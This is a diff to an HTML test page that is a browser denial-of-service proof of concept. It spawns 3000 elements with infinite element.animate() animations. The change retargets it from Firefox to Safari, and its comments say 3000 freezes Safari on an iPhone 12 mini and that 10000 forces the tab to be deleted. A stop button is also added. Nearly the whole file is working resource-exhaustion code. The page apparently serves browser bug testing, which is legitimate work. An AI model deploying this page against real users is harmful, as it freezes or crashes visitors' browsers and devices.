@@ -4,12 +4,15 @@
 </head>
 <body>
 
-<p>animation DoS test - real API</p>
+<p>animation DoS test - Safari - real API</p>
 <button onclick="go()">click here</button>
+<button onclick="stop()">stop</button>
 <p id="h"></p>
 <p id="h2"></p>
 
 <script>
+var anims = [];
+
 function go(){
   document.getElementById('h').innerText = 'creating animations - real API...';
 
@@ -17,29 +20,39 @@ function go(){
   var count = 0;
 
   try {
-    // bikin 10000 animasi beneran, bukan simulasi
-    for(let i=0; i<10000; i++){
+    // 3000 is enough for Safari on iPhone 12 mini to freeze
+    // 10000 is too much - it forces you to delete the tab
+    for(let i=0; i<3000; i++){
       var div = document.createElement('div');
       div.style.width = '10px';
       div.style.height = '10px';
       div.style.background = 'red';
       document.body.appendChild(div);
 
-      // ini API asli: element.animate()
-      div.animate(
+      // real API: element.animate()
+      var a = div.animate(
         [{ opacity: 0, transform: 'translateX(0px)' }, { opacity: 1, transform: 'translateX(100px)' }],
         { duration: 1000, iterations: Infinity }
       );
+      anims.push(a);
       count++;
     }
 
     var end = performance.now();
     document.getElementById('h').innerText = 'created ' + count + ' real animations in ' + (end-start).toFixed(1) + 'ms';
-    document.getElementById('h2').innerText = 'if 【entity-Firefox¦canonical_name=Firefox】 freezes / lags / crashes now, it is DoS. Try scrolling / closing tab.';
+    document.getElementById('h2').innerText = 'if Safari freezes / lags / crashes now, it is DoS. Try scrolling / closing tab.';
 
   } catch(e) {
     document.getElementById('h').innerText = 'blocked: ' + e;
   }
+}
+
+function stop(){
+  for(let a of anims){
+    try { a.cancel(); } catch(e) {}
+  }
+  anims = [];
+  document.getElementById('h2').innerText = 'stopped';
 }
 </script>
 
